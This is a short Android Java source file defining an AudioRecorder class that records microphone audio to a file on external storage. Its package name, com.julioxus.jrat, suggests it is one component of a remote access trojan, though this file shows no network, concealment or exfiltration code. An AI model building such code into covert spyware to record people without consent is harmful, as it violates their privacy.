package com.julioxus.jrat;

import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import java.io.IOException;

/**
 * Created by Juan on 03/06/2016.
 */
public class AudioRecorder {

    private static final String LOG_TAG = "AudioRecorder";
    private MediaRecorder mRecorder = null;
    private String mFileName = null;
    private int time;


    public AudioRecorder(String mFileName, int time){
        this.mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
        this.mFileName += "/" + mFileName;
        this.time=time;
    }

    public void startRecording() {
        mRecorder = new MediaRecorder();
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mRecorder.setOutputFile(mFileName);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

        try {
            mRecorder.prepare();
        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

        mRecorder.start();
    }

    public void stopRecording() {
        mRecorder.stop();
        mRecorder.reset();
        mRecorder.release();
        mRecorder = null;
    }

    public String getmFileName() {
        return mFileName;
    }
}
